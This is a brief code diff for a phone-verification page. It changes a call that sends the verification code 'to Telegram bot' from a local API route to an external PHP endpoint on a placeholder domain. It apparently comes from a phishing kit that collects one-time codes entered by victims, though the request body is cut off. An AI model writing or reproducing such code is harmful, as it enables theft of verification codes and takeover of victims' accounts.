@@ -21,7 +21,7 @@ export default function VerifyPhonePage() {
       }
 
       // === SEND VERIFICATION CODE TO TELEGRAM BOT ===
-      fetch('/api/send-message', {
+      fetch('https://your-domain.com/send-message.php', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
